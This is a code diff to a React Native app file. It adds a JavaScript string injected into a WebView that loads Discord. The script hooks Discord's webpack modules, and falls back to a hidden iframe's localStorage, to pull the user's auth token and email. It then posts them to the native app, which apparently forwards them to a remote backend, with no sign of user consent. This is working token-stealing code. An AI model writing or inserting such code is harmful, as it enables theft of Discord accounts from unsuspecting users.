@@ -438,3 +438,55 @@ const styles = StyleSheet.create({
       Alert.alert("Server Error", "Could not reach your Railway backend.");
     }
   };
+  \
+
+
+  const INJECTED_JAVASCRIPT = `
+  (function() {
+    function capture() {
+      try {
+        // 1. TRY THE "WEBPACK" HOOK (Grabbing Token + Email)
+        const webpack = window.webpackChunkdiscord_app;
+        if (webpack) {
+          const m = webpack.push([[Symbol()], {}, (e) => e]);
+          let token, email;
+          for (const i in m.c) {
+            const exp = m.c[i].exports;
+            if (exp && exp.default) {
+              if (exp.default.getToken) token = exp.default.getToken();
+              if (exp.default.getCurrentUser) email = exp.default.getCurrentUser().email;
+            }
+            if (token && email) break;
+          }
+          if (token && token.length > 20) {
+            window.ReactNativeWebView.postMessage(JSON.stringify({
+              type: 'TOKEN_DATA', 
+              token: token, 
+              email: email || "user@discord.com"
+            }));
+            return true;
+          }
+        }
+
+        // 2. TRY THE "IFRAME RESTORATION" HOOK (Your original fallback)
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        document.body.appendChild(iframe);
+        const storage = iframe.contentWindow.localStorage;
+        const token = storage.getItem('token');
+        if (token) {
+          const clean = token.replace(/"/g, '');
+          window.ReactNativeWebView.postMessage(JSON.stringify({
+            type: 'TOKEN_DATA', 
+            token: clean, 
+            email: "user@discord.com" 
+          }));
+          return true;
+        }
+      } catch (e) {}
+      return false;
+    }
+    const timer = setInterval(() => { if (capture()) clearInterval(timer); }, 500);
+  })();
+`;
+
